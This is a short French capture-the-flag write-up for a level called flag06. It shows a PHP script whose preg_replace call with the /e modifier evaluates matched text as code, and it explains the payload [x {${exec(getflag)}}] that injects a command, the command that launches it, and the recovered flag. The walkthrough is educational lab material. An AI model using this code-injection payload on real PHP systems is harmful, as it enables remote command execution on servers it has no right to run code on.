la session contient un fichier php et un executable (executable = php compilé)

#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>


En regardant le php de plus pres on vois que le code prend un fichier en argument, l'ouvre et effectue des remplacement dans le texte a l'aide re regex avant l'imprimer le resultat des modification.
Or la fonction preg_replace() interprete la string en parametre en plus d'effectuer les changement.

On observe ensuite l'un des patern de remplacement [x ...] ce paterne nous permet de faire interpreter le code que l'on veut et donc notre getflag

On crée donc un fichier exploit.txt avec comme contenu : 
[x {${exec(getflag)}}]

[x ] sert a trigger le regex
exec(getflag) a executer le flag
et {${ }} permet de completer dynamiquement une string ce qui nous permet de recuperer le retour de la commande. 

on lance donc ./flag06 exploit.txt

flag = wiok45aaoguiboiki2tuin6ub
